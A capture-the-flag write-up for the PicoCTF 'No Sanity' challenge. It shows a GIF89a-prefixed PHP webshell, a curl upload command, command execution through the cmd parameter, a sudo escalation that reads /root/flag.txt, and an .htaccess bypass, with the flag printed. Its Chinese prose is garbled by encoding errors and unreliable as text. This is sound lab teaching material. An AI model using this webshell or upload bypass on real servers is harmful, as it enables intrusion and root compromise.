# CTF-08锛氭枃浠朵笂浼?+ Webshell + sudo 鎻愭潈

> PicoCTF 鈥?No Sanity.
> "GIF89a" 寮€灞€锛宻hell 鏀跺熬銆?> 鍏宠仈锛歔[CTF-01_Session涓嶈繃鏈熶笌Cookie鍔寔.md]]

---

## 棰樼洰

涓€涓ご鍍忎笂浼犻〉闈紝`upload.php`锛屾病鏈変换浣曟枃浠剁被鍨嬫牎楠岋紙"No Sanity"锛夈€傜洰鏍囨槸鎷垮埌 `/root/flag.txt`銆?
---

## 瑙ｉ杩囩▼

### Step 1锛氬彂鐜版紡娲?
```html
<input type="file" onchange="loadFile(event)" ...>
```

JS 閲?`var type = file.type;` 璇诲彇浜嗘枃浠剁被鍨嬶紝浣嗘病鏈夊仛浠讳綍鏍￠獙銆傛湭浣跨敤鍙橀噺锛屽舰鍚岃櫄璁俱€?
`upload.php` 鏈嶅姟绔悓鏍锋病鏈夋牎楠屻€傛爣棰?"No Sanity" = 娌℃湁 check銆?
### Step 2锛氫笂浼?webshell

shell.php 鏂囦欢鍐呭锛?
```php
GIF89a<?php system($_GET['cmd']); ?>
```

- `GIF89a` 鏄?GIF 鏂囦欢澶达紝缁曡繃绠€鍗曠殑 magic bytes 妫€鏌?- `system($_GET['cmd'])` 閫氳繃 URL 鍙傛暟鎵ц浠绘剰鍛戒护

涓婁紶锛?
```bash
curl -X POST http://target/upload.php \
  -F "fileToUpload=@shell.php" \
  -F "submit=Upload File"
```

鍝嶅簲锛?
```
The file shell.php has been uploaded Path: uploads/shell.php
```

### Step 3锛氶獙璇?webshell

```
http://target/uploads/shell.php?cmd=echo%20hello
```

杩斿洖 `GIF89ahello`锛岀‘璁?PHP 琚墽琛屻€?
### Step 4锛氫俊鎭敹闆?
```
?cmd=whoami      鈫?www-data锛圓pache 杩愯鐢ㄦ埛锛??cmd=ls /        鈫?bin boot dev etc home ...
?cmd=sudo -l     鈫?鍙戠幇 www-data 鍙互鏃犲瘑鐮佹墽琛?sudo
?cmd=sudo ls /root 鈫?flag.txt
```

### Step 5锛氭彁鏉冩嬁 flag

```
?cmd=sudo%20cat%20/root/flag.txt
```

```
picoCTF{wh47_c4n_u_d0_wPHP_075b4e66}
```

---

## 鐭ヨ瘑鐐?
| 姒傚康 | 璇存槑 |
|------|------|
| 鏃犻檺鍒舵枃浠朵笂浼?| 鏈嶅姟绔湭鏍￠獙鏂囦欢绫诲瀷鍜屽唴瀹癸紝鍏佽涓婁紶浠绘剰鏂囦欢 |
| multipart/form-data | 鏂囦欢涓婁紶鐨?HTTP 鍗忚鏍煎紡锛宐oundary 鍒嗛殧鍚勫瓧娈?|
| webshell | 涓€鍙ヨ瘽鏈ㄩ┈锛岄€氳繃 `$_GET['cmd']` 鎵ц绯荤粺鍛戒护 |
| URL 缂栫爜 | `%20` = 绌烘牸锛宍%2F` = `/`锛宻hell 鍛戒护闇€缂栫爜 |
| sudo 鎻愭潈 | `www-data` 鎰忓鎷ユ湁鏃犲瘑鐮?sudo 鏉冮檺 鈫?鐩存帴璇?`/root` |
| .htaccess | Apache 鐩綍閰嶇疆锛屽彲鏀瑰啓瑙ｆ瀽瑙勫垯锛堝 .txt 鈫?PHP锛?|

## 鍙︿竴绉嶈В娉?
濡傛灉 `uploads/` 绂佷簡 PHP 鎵ц锛堣繑鍥?`GIF89a` 涓嶅甫鍛戒护杈撳嚭锛夛紝鍙互锛?
1. 涓婁紶 `.htaccess`锛歚AddType application/x-httpd-php .txt`
2. 涓婁紶 `shell.txt`锛氬唴瀹瑰悓涓婏紝鍚庣紑鏀逛负 `.txt`
3. Apache 浼氭妸 `.txt` 褰?PHP 瑙ｆ瀽

> 缁勫悎鎷冲墠鎻愶細鏈嶅姟鍣ㄦ槸 Apache锛屼笖娌℃嫤 `.` 寮€澶寸殑鏂囦欢鍚嶃€?
---

## 鍙嶆€?
- 涓婁紶鏍￠獙鏄弻绔殑鈥斺€斿墠绔彲浠ョ粫杩囷紝鍚庣鎵嶆槸搴曠嚎
- 淇℃伅鏀堕泦姣旂洿鎺ユ敾鍑婚噸瑕侊細`whoami` 鈫?`sudo -l` 鐨勯摼璺瘮鏆村姏鐚滆矾寰勯珮鏁?- 鎴愬姛鐨勫叧閿笉鏄煡閬撳灏戝伐鍏凤紝鏄煡閬?涓嬩竴姝ヨ闂粈涔堥棶棰?
